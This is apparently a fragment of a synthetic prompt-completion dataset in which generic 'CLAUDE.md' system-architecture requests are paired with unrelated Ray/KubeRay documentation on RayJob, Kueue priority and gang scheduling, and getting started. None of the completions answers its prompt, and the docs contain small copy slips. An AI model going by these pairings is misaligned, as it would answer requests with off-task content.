`PROVISIONED`.\n`ACCEPTED=True` means that Kueue and the Kubernetes node autoscaler have acknowledged the request.\n`PROVISIONED=True` means that the Kubernetes node autoscaler has completed provisioning nodes.\nOnce both of these conditions are true, the ProvisioningRequest is satisfied.\n```bash\n$ kubectl get provisioningrequest\nNAME                                                      ACCEPTED   PROVISIONED   FAILED   AGE\nrayjob-pytorch-text-classifier-nv77q-e95ec-rayjob-gpu-1   True       True          False    57s\n```\n\nBecause the example RayJob requires 1 GPU for fine-tuning, the ProvisioningRequest is satisfied\nby the addition of a single GPU node in the `gpu-node-pool` Node Pool.\n```bash\n$ kubectl get nodes\nNAME                                                  STATUS   ROLES    AGE   VERSION\ngke-kuberay-gpu-cluster-default-pool-8d883840-fd6d    Ready    <none>   14m   v1.29.0-gke.1381000\ngke-kuberay-gpu-cluster-gpu-node-pool-b176212e-g3db   Ready    <none>   46s   v1.29.0-gke.1381000  # new node with GPUs\n```\n\nOnce the ProvisioningRequest is satisfied, Kueue admits the RayJob.\nThe Kubernetes scheduler then immediately places the head and worker nodes onto the newly provisioned resources.\nThe ProvisioningRequest ensures a seamless Ray cluster start up, with no scheduling delays for any Pods.\n\n```bash\n$ kubectl get pods\nNAME                                                      READY   STATUS    RESTARTS        AGE\npytorch-text-classifier-nv77q-g6z57                       1/1     Running   0               13s\ntorch-text-classifier-nv77q-raycluster-gstrk-head-phnfl   1/1     Running   0               6m43s\n```\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/examples/rayjob-kueue-gang-scheduling.md", "language": "markdown", "complexity": "complex", "star_count": 38179, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 248}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-kueue-priority-scheduling-example)=\n\n# Priority Scheduling with RayJob and Kueue\n\nThis guide shows how to run [Fine-tune a PyTorch Lightning Text Classifier with Ray Data](https://docs.ray.io/en/master/train/examples/lightning/lightning_cola_advanced.html) example as a RayJob and leverage Kueue to orchestrate priority scheduling and quota management.\n\n## What's Kueue?\n\n[Kueue](https://kueue.sigs.k8s.io/) is a Kubernetes-native job queueing system that manages quotas\nand how jobs consume them. Kueue decides when:\n* To make a job wait\n* To admit a job to start, meaning that Kubernetes creates pods.\n* To preempt a job, meaning that Kubernetes deletes active pods.\n\nKueue has native support for some KubeRay APIs. Specifically, you can use Kueue\nto manage resources consumed by RayJob and RayCluster. See the\n[Kueue documentation](https://kueue.sigs.k8s.io/docs/overview/) to learn more.\n\n## Step 0: Create a Kubernetes cluster on GKE (Optional)\n\nIf you already have a Kubernetes cluster with GPUs, you can skip this step.\nOtherwise, follow [Start Google Cloud GKE Cluster with GPUs for KubeRay](kuberay-gke-gpu-cluster-setup) to set up a Kubernetes cluster on GKE.\n\n## Step 1: Install the KubeRay operator\n\nFollow [Deploy a KubeRay operator](kuberay-operator-deploy) to install the latest stable KubeRay operator from the Helm repository.\nThe KubeRay operator Pod must be on the CPU node if you set up the taint for the GPU node pool correctly.\n\n## Step 2: Install Kueue\n\n```bash\nVERSION=v0.8.2\nkubectl apply --server-side -f https://github.com/kubernetes-sigs/kueue/releases/download/$VERSION/manifests.yaml\n```\n\nSee [Kueue Installation](https://kueue.sigs.k8s.io/docs/installation/#install-a-released-version) for more details on installing Kueue.\n\n## Step 3: Configure Kueue with priority scheduling\n\nTo understand this tutorial, it's important to understand the following Kueue concepts:\n* [ResourceFlavor](https://kueue.sigs.k8s.io/docs/concepts/resource_flavor/)\n* [ClusterQueue](https://kueue.sigs.k8s.io/docs/concepts/cluster_queue/)\n* [LocalQueue](https://kueue.sigs.k8s.io/docs/concepts/local_queue/)\n* [WorkloadPriorityClass](https://kueue.sigs.k8s.io/docs/concepts/workload_priority_class/)\n\n```yaml\n# kueue-resources.yaml\napiVersion: kueue.x-k8s.io/v1beta1\nkind: ResourceFlavor\nmetadata:\n  name: \"default-flavor\"\n---\napiVersion: kueue.x-k8s.io/v1beta1\nkind: ClusterQueue\nmetadata:\n  name: \"cluster-queue\"\nspec:\n  preemption:\n    withinClusterQueue: LowerPriority\n  namespaceSelector: {} # Match all namespaces.\n  resourceGroups:\n  - coveredResources: [\"cpu\", \"memory\", \"nvidia.com/gpu\"]\n    flavors:\n    - name: \"default-flavor\"\n      resources:\n      - name: \"cpu\"\n        nominalQuota: 2\n      - name: \"memory\"\n        nominalQuota: 8G\n      - name: \"nvidia.com/gpu\" # ClusterQueue only has quota for a single GPU.\n        nominalQuota: 1\n---\napiVersion: kueue.x-k8s.io/v1beta1\nkind: LocalQueue\nmetadata:\n  namespace: \"default\"\n  name: \"user-queue\"\nspec:\n  clusterQueue: \"cluster-queue\"\n---\napiVersion: kueue.x-k8s.io/v1beta1\nkind: WorkloadPriorityClass\nmetadata:\n  name: prod-priority\nvalue: 1000\ndescription: \"Priority class for prod jobs\"\n---\napiVersion: kueue.x-k8s.io/v1beta1\nkind: WorkloadPriorityClass\nmetadata:\n  name: dev-priority\nvalue: 100\ndescription: \"Priority class for development jobs\"\n```\n\nThe YAML manifest configures:\n\n* **ResourceFlavor**\n  * The ResourceFlavor `default-flavor` is an empty ResourceFlavor because the compute resources in the Kubernetes cluster are homogeneous. In other words, users can request 1 GPU without considering whether it's an NVIDIA A100 or a T4 GPU.\n* **ClusterQueue**\n    * The ClusterQueue `cluster-queue` only has 1 ResourceFlavor `default-flavor` with quotas for 2 CPUs, 8G memory, and 1 GPU. It exactly matches the resources requested by 1 RayJob custom resource. ***Hence, only 1 RayJob can run at a time.***\n    * The ClusterQueue `cluster-queue` has a preemption policy `withinClusterQueue: LowerPriority`. This policy allows the pending RayJob that doesn’t fit within the nominal quota for its ClusterQueue to preempt active RayJob custom resources in the ClusterQueue that have lower priority.\n* **LocalQueue**\n  * The LocalQueue `user-queue` is a namespaced object in the `default` namespace which belongs to a ClusterQueue. A typical practice is to assign a namespace to a tenant, team or user, of an organization. Users submit jobs to a LocalQueue, instead of to a ClusterQueue directly.\n* **WorkloadPriorityClass**\n  * The WorkloadPriorityClass `prod-priority` has a higher value than the WorkloadPriorityClass `dev-priority`. This means that RayJob custom resources with the `prod-priority` priority class take precedence over RayJob custom resources with the `dev-priority` priority class.\n\nCreate the Kueue resources:\n```bash\nkubectl apply -f kueue-resources.yaml\n```\n\n## Step 4: Deploy a RayJob\n\nDownload the RayJob that executes all the steps documented in [Fine-tune a PyTorch Lightning Text Classifier](https://docs.ray.io/en/master/train/examples/lightning/lightning_cola_advanced.html). The [source code](https://github.com/ray-project/kuberay/tree/master/ray-operator/config/samples/pytorch-text-classifier) is also in the KubeRay repository.\n\n```bash\ncurl -LO https://raw.githubusercontent.com/ray-project/kuberay/master/ray-operator/config/samples/pytorch-text-classifier/ray-job.pytorch-distributed-training.yaml\n```\n\nBefore creating the RayJob, modify the RayJob metadata with:\n\n```yaml\nmetadata:\n  generateName: dev-pytorch-text-classifier-\n  labels:\n    kueue.x-k8s.io/queue-name: user-queue\n    kueue.x-k8s.io/priority-class: dev-priority\n```\n\n* `kueue.x-k8s.io/queue-name: user-queue`: As the previous step mentioned, users submit jobs to a LocalQueue instead of directly to a ClusterQueue.\n* `kueue.x-k8s.io/priority-class: dev-priority`: Assign the RayJob with the `dev-priority` WorkloadPriorityClass.\n* A modified name to indicate that this job is for development.\n\nAlso note the resources required for this RayJob by looking at the resources that the Ray head Pod requests:\n```yaml\nresources:\n  limits:\n    memory: \"8G\"\n    nvidia.com/gpu: \"1\"\n  requests:\n    cpu: \"2\"\n    memory: \"8G\"\n    nvidia.com/gpu: \"1\"\n```\n\nNow deploy the RayJob:\n```bash\n$ kubectl create -f ray-job.pytorch-distributed-training.yaml\nrayjob.ray.io/dev-pytorch-text-classifier-r6d4p created\n```\n\nVerify that the RayCluster and the submitter Kubernetes Job are running:\n```bash\n$ kubectl get pod\nNAME                                                      READY   STATUS    RESTARTS   AGE\ndev-pytorch-text-classifier-r6d4p-4nczg                   1/1     Running   0          4s  # Submitter Kubernetes Job\ntorch-text-classifier-r6d4p-raycluster-br45j-head-8bbwt   1/1     Running   0          34s # Ray head Pod\n```\n\nDelete the RayJob after verifying that the job has completed successfully.\n```bash\n$ kubectl get rayjobs.ray.io dev-pytorch-text-classifier-r6d4p -o jsonpath='{.status.jobStatus}'\nSUCCEEDED\n$ kubectl get rayjobs.ray.io dev-pytorch-text-classifier-r6d4p -o jsonpath='{.status.jobDeploymentStatus}'\nComplete\n$ kubectl delete rayjob dev-pytorch-text-classifier-r6d4p\nrayjob.ray.io \"dev-pytorch-text-classifier-r6d4p\" deleted\n```\n\n## Step 5: Queuing multiple RayJob resources\n\nCreate 3 RayJob custom resources to see how Kueue interacts with KubeRay to implement job queueing.\n\n```bash\n$ kubectl create -f ray-job.pytorch-distributed-training.yaml\nrayjob.ray.io/dev-pytorch-text-classifier-8vg2c created\n$ kubectl create -f ray-job.pytorch-distributed-training.yaml\nrayjob.ray.io/dev-pytorch-text-classifier-n5k89 created\n$ kubectl create -f ray-job.pytorch-distributed-training.yaml\nrayjob.ray.io/dev-pytorch-text-classifier-ftcs9 created\n```\n\nBecause each RayJob requests 1 GPU and the ClusterQueue has quotas for only 1 GPU,\nKueue automatically suspends new RayJob resources until GPU quotas become available.\n\nYou can also inspect the `ClusterQueue` to see available and used quotas:\n```bash\n$ kubectl get clusterqueue\nNAME            COHORT   PENDING WORKLOADS\ncluster-queue            2\n$ kubectl get clusterqueue cluster-queue -o yaml\napiVersion: kueue.x-k8s.io/v1beta1\nkind: ClusterQueue\n...\n...\n...\nstatus:\n  admittedWorkloads: 1  # Workloads admitted by queue.\n  flavorsReservation:\n  - name: default-flavor\n    resources:\n    - borrowed: \"0\"\n      name: cpu\n      total: \"8\"\n    - borrowed: \"0\"\n      name: memory\n      total: 19531250Ki\n    - borrowed: \"0\"\n      name: nvidia.com/gpu\n      total: \"2\"\n  flavorsUsage:\n  - name: default-flavor\n    resources:\n    - borrowed: \"0\"\n      name: cpu\n      total: \"8\"\n    - borrowed: \"0\"\n      name: memory\n      total: 19531250Ki\n    - borrowed: \"0\"\n      name: nvidia.com/gpu\n      total: \"2\"\n  pendingWorkloads: 2   # Queued workloads waiting for quotas.\n  reservingWorkloads: 1 # Running workloads that are using quotas.\n```\n\n## Step 6: Deploy a RayJob with higher priority\n\nAt this point there are multiple RayJob custom resources queued up but only enough quota to run a single RayJob.\nNow you can create a new RayJob with higher priority to preempt the already queued RayJob resources.\nModify the RayJob with:\n\n```yaml\nmetadata:\n  generateName: prod-pytorch-text-classifier-\n  labels:\n    kueue.x-k8s.io/queue-name: user-queue\n    kueue.x-k8s.io/priority-class: prod-priority\n```\n\n* `kueue.x-k8s.io/queue-name: user-queue`: As the previous step mentioned, users submit jobs to a LocalQueue instead of directly to a ClusterQueue.\n* `kueue.x-k8s.io/priority-class: dev-priority`: Assign the RayJob with the `prod-priority` WorkloadPriorityClass.\n* A modified name to indicate that this job is for production.\n\nCreate the new RayJob:\n```sh\n$ kubectl create -f ray-job.pytorch-distributed-training.yaml\nrayjob.ray.io/prod-pytorch-text-classifier-gkp9b created\n```\n\nNote that higher priority jobs preempt lower priority jobs when there aren't enough quotas for both:\n```bash\n$ kubectl get pods\nNAME                                                      READY   STATUS    RESTARTS   AGE\nprod-pytorch-text-classifier-gkp9b-r9k5r                  1/1     Running   0          5s\ntorch-text-classifier-gkp9b-raycluster-s2f65-head-hfvht   1/1     Running   0          35s\n```\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/examples/rayjob-kueue-priority-scheduling.md", "language": "markdown", "complexity": "complex", "star_count": 38179, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 259}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-quickstart)=\n\n# Getting Started with KubeRay\n\n```{toctree}\n:hidden:\n\ngetting-started/kuberay-operator-installation\ngetting-started/raycluster-quick-start\ngetting-started/rayjob-quick-start\ngetting-started/rayservice-quick-start\n```\n\n\n## Custom Resource Definitions (CRDs)\n\n[KubeRay](https://github.com/ray-project/kuberay) is a powerful, open-source Kubernetes operator that simplifies the deployment and management of Ray applications on Kubernetes.\nIt offers 3 custom resource definitions (CRDs):\n\n* **RayCluster**: KubeRay fully manages the lifecycle of RayCluster, including cluster creation/deletion, autoscaling, and ensuring fault tolerance.\n\n* **RayJob**: With RayJob, KubeRay automatically creates a RayCluster and submits a job when the cluster is ready. You can also configure RayJob to automatically delete the RayCluster once the job finishes.\n\n* **RayService**: RayService is made up of two parts: a RayCluster and Ray Serve deployment graphs. RayService offers zero-downtime upgrades for RayCluster and high availability.\n\n## Which CRD should you choose?\n\nUsing [RayService](kuberay-rayservice-quickstart) to serve models and using [RayCluster](kuberay-raycluster-quickstart) to develop Ray applications are no-brainer recommendations from us.\nHowever, if the use case is not model serving or prototyping, how do you choose between [RayCluster](kuberay-raycluster-quickstart) and [RayJob](kuberay-rayjob-quickstart)?\n\n### Q: Is downtime acceptable during a cluster upgrade (e.g. Upgrade Ray version)?\n\nIf not, use RayJob. RayJob can be configured to automatically delete the RayCluster once the job is completed. You can switch between Ray versions and configurations for each job submission using RayJob.\n\nIf yes, use RayCluster. Ray doesn't natively support rolling upgrades; thus, you'll need to manually shut down and create a new RayCluster.\n\n### Q: Are you deploying on public cloud providers (e.g. AWS, GCP, Azure)?\n\nIf yes, use RayJob. It allows automatic deletion of the RayCluster upon job completion, helping you reduce costs.\n\n### Q: Do you care about the latency introduced by spinning up a RayCluster?\n\nIf yes, use RayCluster.\nUnlike RayJob, which creates a new RayCluster every time a job is submitted, RayCluster creates the cluster just once and can be used multiple times.\n\n## Run your first Ray application on Kubernetes!\n\n* [RayCluster Quick Start](kuberay-raycluster-quickstart)\n* [RayJob Quick Start](kuberay-rayjob-quickstart)\n* [RayService Quick Start](kuberay-rayservice-quickstart)\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/getting-started.md", "language": "markdown", "complexity": "simple", "star_count": 38179, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 51}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-rayjob-quickstart)=\n\n# RayJob Quickstart\n\n## Prerequisites\n\n* KubeRay v0.6.0 or higher\n  * KubeRay v0.6.0 or v1.0.0: Ray 1.10 or higher.\n  * KubeRay v1.1.1 or newer is highly recommended: Ray 2.8.0 or higher.\n\n## What's a RayJob?\n\nA RayJob manages two aspects:\n\n* **RayCluster**: A RayCluster custom resource manages all Pods in a Ray cluster, including a head Pod and multiple worker Pods.\n* **Job**: A Kubernetes Job runs `ray job submit` to submit a Ray job to the RayCluster.\n\n## What does the RayJob provide?\n\nWith RayJob, KubeRay automatically creates a RayCluster and submits a job when the cluster is ready. You can also configure RayJob to automatically delete the RayCluster once the Ray job finishes.\n\nTo understand the following content better, you should understand the difference between:\n* RayJob: A Kubernetes custom resource definition provided by KubeRay.\n* Ray job: A Ray job is a packaged Ray application that can run on a remote Ray cluster. See [this document](jobs-overview) for more details.\n* Submitter: The submitter is a Kubernetes Job that runs `ray job submit` to submit a Ray job to the RayCluster.\n\n## RayJob Configuration\n\n* RayCluster configuration\n  * `rayClusterSpec` - Defines the **RayCluster** custom resource to run the Ray job on.\n  * `clusterSelector` - Use existing **RayCluster** custom resources to run the Ray job instead of creating a new one. See [ray-job.use-existing-raycluster.yaml](https://github.com/ray-project/kuberay/blob/master/ray-operator/config/samples/ray-job.use-existing-raycluster.yaml) for example configurations.\n* Ray job configuration\n  * `entrypoint` - The submitter runs `ray job submit --address ... --submission-id ... -- $entrypoint` to submit a Ray job to the RayCluster.\n  * `runtimeEnvYAML` (Optional): A runtime environment that describes the dependencies the Ray job needs to run, including files, packages, environment variables, and more. Provide the configuration as a multi-line YAML string.\n  Example:\n\n    ```yaml\n    spec:\n      runtimeEnvYAML: |\n        pip:\n          - requests==2.26.0\n          - pendulum==2.1.2\n        env_vars:\n          KEY: \"VALUE\"\n    ```\n\n  See {ref}`Runtime Environments <runtime-environments>` for more details. _(New in KubeRay version 1.0.0)_\n  * `jobId` (Optional): Defines the submission ID for the Ray job. If not provided, KubeRay generates one automatically. See {ref}`Ray Jobs CLI API Reference <ray-job-submission-cli-ref>` for more details about the submission ID.\n  * `metadata` (Optional): See {ref}`Ray Jobs CLI API Reference <ray-job-submission-cli-ref>` for more details about the `--metadata-json` option.\n  * `entrypointNumCpus` / `entrypointNumGpus` / `entrypointResources` (Optional): See {ref}`Ray Jobs CLI API Reference <ray-job-submission-cli-ref>` for more details.\n  * `backoffLimit` (Optional, added in version 1.2.0): Specifies the number of retries before marking this RayJob failed. Each retry creates a new RayCluster. The default value is 0.\n* Submission configuration\n  * `submissionMode` (Optional): `submissionMode` specifies how RayJob submits the Ray job to the RayCluster. In \"K8sJobMode\", the KubeRay operator creates a submitter Kubernetes Job to submit the Ray job. In \"HTTPMode\", the KubeRay operator sends a request to the RayCluster to create a Ray job. The default value is \"K8sJobMode\".\n  * `submitterPodTemplate` (Optional): Defines the Pod template for the submitter Kubernetes Job. This field is only effective when `submissionMode` is \"K8sJobMode\".\n    * `RAY_DASHBOARD_ADDRESS` - The KubeRay operator injects this environment variable to the submitter Pod. The value is `$HEAD_SERVICE:$DASHBOARD_PORT`.\n    * `RAY_JOB_SUBMISSION_ID` - The KubeRay operator injects this environment variable to the submitter Pod. The value is the `RayJob.Status.JobId` of the RayJob.\n    * Example: `ray job submit --address=http://$RAY_DASHBOARD_ADDRESS --submission-id=$RAY_JOB_SUBMISSION_ID ...`\n    * See [ray-job.sample.yaml](https://github.com/ray-project/kuberay/blob/master/ray-operator/config/samples/ray-job.sample.yaml) for more details.\n  * `submitterConfig` (Optional): Additional configurations for the submitter Kubernetes Job.\n    * `backoffLimit` (Optional, added in version 1.2.0): The number of retries before marking the submitter Job as failed. The default value is 2.\n* Automatic resource cleanup\n  * `shutdownAfterJobFinishes` (Optional): Determines whether to recycle the RayCluster after the Ray job finishes. The default value is false.\n  * `ttlSecondsAfterFinished` (Optional): Only works if `shutdownAfterJobFinishes` is true. The KubeRay operator deletes the RayCluster and the submitter `ttlSecondsAfterFinished` seconds after the Ray job finishes. The default value is 0.\n  * `activeDeadlineSeconds` (Optional): If the RayJob doesn't transition the `JobDeploymentStatus` to `Complete` or `Failed` within `activeDeadlineSeconds`, the KubeRay operator transitions the `JobDeploymentStatus` to `Failed`, citing `DeadlineExceeded` as the reason.\n  * `DELETE_RAYJOB_CR_AFTER_JOB_FINISHES` (Optional, added in version 1.2.0): Set this environment variable for the KubeRay operator, not the RayJob resource. If you set this environment variable to true, the RayJob custom resource itself is deleted if you also set `shutdownAfterJobFinishes` to true. Note that KubeRay deletes all resources created by the RayJob, including the Kubernetes Job.\n* Others\n  * `suspend` (Optional): If `suspend` is true, KubeRay deletes both the RayCluster and the submitter. Note that Kueue also implements scheduling strategies by mutating this field. Avoid manually updating this field if you use Kueue to schedule RayJob.\n  * `deletionPolicy` (Optional, alpha in v1.3.0): Indicates what resources of the RayJob are deleted upon job completion. Valid values are `DeleteCluster`, `DeleteWorkers`, `DeleteSelf` or `DeleteNone`. If unset, deletion policy is based on `spec.shutdownAfterJobFinishes`. This field requires the `RayJobDeletionPolicy` feature gate to be enabled.\n    * `DeleteCluster` - Deletion policy to delete the RayCluster custom resource, and its Pods, on job completion.\n    * `DeleteWorkers` - Deletion policy to delete only the worker Pods on job completion.\n    * `DeleteSelf` - Deletion policy to delete the RayJob custom resource (and all associated resources) on job completion.\n    * `DeleteNone` - Deletion policy to delete no resources on job completion.\n\n\n## Example: Run a simple Ray job with RayJob\n\n## Step 1: Create a Kubernetes cluster with Kind\n\n```sh\nkind create cluster --image=kindest/node:v1.26.0\n```\n\n## Step 2: Install the KubeRay operator\n\nFollow the [KubeRay Operator Installation](kuberay-operator-deploy) to install the latest stable KubeRay operator by Helm repository.\n\n## Step 3: Install a RayJob\n\n```sh\nkubectl apply -f https://raw.githubusercontent.com/ray-project/kuberay/v1.4.2/ray-operator/config/samples/ray-job.sample.yaml\n```\n\n## Step 4: Verify the Kubernetes cluster status\n\n```shell\n# Step 4.1: List all RayJob custom resources in the `default` namespace.\nkubectl get rayjob\n\n# [Example output]\n# NAME            JOB STATUS   DEPLOYMENT STATUS   RAY CLUSTER NAME      START TIME             END TIME               AGE\n# rayjob-sample   SUCCEEDED    Complete            rayjob-sample-qnftt   2025-06-25T16:21:21Z   2025-06-25T16:22:35Z   6m53s\n\n# Step 4.2: List all RayCluster custom resources in the `default` namespace.\nkubectl get raycluster\n\n# [Example output]\n# NAME                  DESIRED WORKERS   AVAILABLE WORKERS   CPUS   MEMORY   GPUS   STATUS   AGE\n# rayjob-sample-qnftt   1                 1                   400m   0        0      ready    7m48s\n\n# Step 4.3: List all Pods in the `default` namespace.\n# The Pod created by the Kubernetes Job will be terminated after the Kubernetes Job finishes.\nkubectl get pods\n\n# [Example output]\n# kuberay-operator-755f666c4b-wbcm4              1/1     Running     0          8m32s\n# rayjob-sample-n2vj5                            0/1     Completed   0          7m18ss => Pod created by a Kubernetes Job\n# rayjob-sample-qnftt-head                       1/1     Running     0          8m14s\n# rayjob-sample-qnftt-small-group-worker-4f5wz   1/1     Running     0          8m14s\n\n# Step 4.4: Check the status of the RayJob.\n# The field `jobStatus` in the RayJob custom resource will be updated to `SUCCEEDED` and `jobDeploymentStatus`\n# should be `Complete` once the job finishes.\nkubectl get rayjobs.ray.io rayjob-sample -o jsonpath='{.status.jobStatus}'\n# [Expected output]: \"SUCCEEDED\"\n\nkubectl get rayjobs.ray.io rayjob-sample -o jsonpath='{.status.jobDeploymentStatus}'\n# [Expected output]: \"Complete\"\n```\n\nThe KubeRay operator creates a RayCluster custom resource based on the `rayClusterSpec` and a submitter Kubernetes Job to submit a Ray job to the RayCluster.\nIn this example, the `entrypoint` is `python /home/ray/samples/sample_code.py`, and `sample_code.py` is a Python script stored in a Kubernetes ConfigMap mounted to the head Pod of the RayCluster.\nBecause the default value of `shutdownAfterJobFinishes` is false, the KubeRay operator doesn't delete the RayCluster or the submitter when the Ray job finishes.\n\n## Step 5: Check the output of the Ray job\n\n```sh\nkubectl logs -l=job-name=rayjob-sample\n\n# [Example output]\n# 2025-06-25 09:22:27,963 INFO worker.py:1654 -- Connecting to existing Ray cluster at address: 10.244.0.6:6379...\n# 2025-06-25 09:22:27,977 INFO worker.py:1832 -- Connected to Ray cluster. View the dashboard at 10.244.0.6:8265 \n# test_counter got 1\n# test_counter got 2\n# test_counter got 3\n# test_counter got 4\n# test_counter got 5\n# 2025-06-25 09:22:31,719 SUCC cli.py:63 -- -----------------------------------\n# 2025-06-25 09:22:31,719 SUCC cli.py:64 -- Job 'rayjob-sample-zdxm6' succeeded\n# 2025-06-25 09:22:31,719 SUCC cli.py:65 -- -----------------------------------\n```\n\nThe Python script `sample_code.py` used by `entrypoint` is a simple Ray script that executes a counter's increment function 5 times.\n\n## Step 6: Delete the RayJob\n\n```sh\nkubectl delete -f https://raw.githubusercontent.com/ray-project/kuberay/v1.4.2/ray-operator/config/samples/ray-job.sample.yaml\n```\n\n## Step 7: Create a RayJob with `shutdownAfterJobFinishes` set to true\n\n```sh\nkubectl apply -f https://raw.githubusercontent.com/ray-project/kuberay/v1.4.2/ray-operator/config/samples/ray-job.shutdown.yaml\n```\n\nThe `ray-job.shutdown.yaml` defines a RayJob custom resource with `shutdownAfterJobFinishes: true` and `ttlSecondsAfterFinished: 10`.\nHence, the KubeRay operator deletes the RayCluster 10 seconds after the Ray job finishes. Note that the submitter job isn't deleted\nbecause it contains the ray job logs and doesn't use any cluster resources once completed. In addition, the RayJob cleans up the submitter job\nwhen the RayJob is eventually deleted due to its owner reference back to the RayJob.\n\n## Step 8: Check the RayJob status\n\n```sh\n# Wait until `jobStatus` is `SUCCEEDED` and `jobDeploymentStatus` is `Complete`.\nkubectl get rayjobs.ray.io rayjob-sample-shutdown -o jsonpath='{.status.jobDeploymentStatus}'\nkubectl get rayjobs.ray.io rayjob-sample-shutdown -o jsonpath='{.status.jobStatus}'\n```\n\n## Step 9: Check if the KubeRay operator deletes the RayCluster\n\n```sh\n# List the RayCluster custom resources in the `default` namespace. The RayCluster\n# associated with the RayJob `rayjob-sample-shutdown` should be deleted.\nkubectl get raycluster\n```\n\n## Step 10: Clean up\n\n```sh\n# Step 10.1: Delete the RayJob\nkubectl delete -f https://raw.githubusercontent.com/ray-project/kuberay/v1.4.2/ray-operator/config/samples/ray-job.shutdown.yaml\n\n# Step 10.2: Delete the KubeRay operator\nhelm uninstall kuberay-operator\n\n# Step 10.3: Delete the Kubernetes cluster\nkind delete cluster\n```\n\n## Next steps\n\n* [RayJob Batch Inference Example](kuberay-batch-inference-example)\n* [Priority Scheduling with RayJob and Kueue](kuberay-kueue-priority-scheduling-example)\n* [Gang Scheduling with RayJob and Kueue](kuberay-kueue-gang-scheduling-example)", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/getting-started/rayjob-quick-start.md", "language": "markdown", "complexity": "complex", "star_count": 38179, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 204}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Ray on Kubernetes\n\n```{toctree}\n:hidden:\n\ngetting-started\nuser-guides\nexamples\nk8s-ecosystem\nbenchmarks\ntroubleshooting\nreferences\n```\n\n(kuberay-index)=\n## Overview\n\nIn this section we cover how to execute your distributed Ray programs on a Kubernetes cluster.\n\nUsing the [KubeRay operator](https://github.com/ray-project/kuberay) is the\nrecommended way to do so. The operator provides a Kubernetes-native way to manage Ray clusters.\nEach Ray cluster consists of a head node pod and a collection of worker node pods. Optional\nautoscaling support allows the KubeRay operator to size your Ray clusters according to the\nrequirements of your Ray workload, adding and removing Ray pods as needed. KubeRay supports\nheterogenous compute nodes (including GPUs) as well as running multiple Ray clusters with\ndifferent Ray versions in the same Kubernetes cluster.\n\n```{eval-rst}\n.. image:: images/ray_on_kubernetes.png\n    :align: center\n..\n  Find source document here: https://docs.google.com/drawings/d/1E3FQgWWLuj8y2zPdKXjoWKrfwgYXw6RV_FWRwK8dVlg/edit\n```\n\nKubeRay introduces three distinct Kubernetes Custom Resource Definitions (CRDs): **RayCluster**, **RayJob**, and **RayService**.\nThese CRDs assist users in efficiently managing Ray clusters tailored to various use cases.\n\nSee [Getting Started](kuberay-quickstart) to learn the basics of KubeRay and follow the quickstart guides to run your first Ray application on Kubernetes with KubeRay.\n\n* [RayCluster Quick Start](kuberay-raycluster-quickstart)\n* [RayJob Quick Start](kuberay-rayjob-quickstart)\n* [RayService Quick Start](kuberay-rayservice-quickstart)\n\nAdditionally, [Anyscale](https://console.anyscale.com/register/ha?render_flow=ray&utm_source=ray_docs&utm_medium=docs&utm_campaign=ray-doc-upsell&utm_content=deploy-ray-on-k8s) is the managed Ray platform developed by the creators of Ray. It offers an easy path to deploy Ray clusters on your existing Kubernetes infrastructure, including EKS, GKE, AKS, or self-hosted Kubernetes.\n\n## Learn More\n\nThe Ray docs present all the information you need to start running Ray workloads on Kubernetes.\n\n```{eval-rst}\n.. grid:: 1 2 2 2\n    :gutter: 1\n    :class-container: container pb-3\n\n    .. grid-item-card::\n\n        **Getting Started**\n        ^^^\n\n        Learn how to start a Ray cluster and deploy Ray applications on Kubernetes.\n\n        +++\n        .. button-ref:: kuberay-quickstart\n            :color: primary\n            :outline:\n            :expand:\n\n            Get Started with Ray on Kubernetes\n\n    .. grid-item-card::\n\n        **User Guides**\n        ^^^\n\n        Learn best practices for configuring Ray clusters on Kubernetes.\n\n        +++\n        .. button-ref:: kuberay-guides\n            :color: primary\n            :outline:\n            :expand:\n\n            Read the User Guides\n\n    .. grid-item-card::\n\n        **Examples**\n        ^^^\n\n        Try example Ray workloads on Kubernetes.\n\n  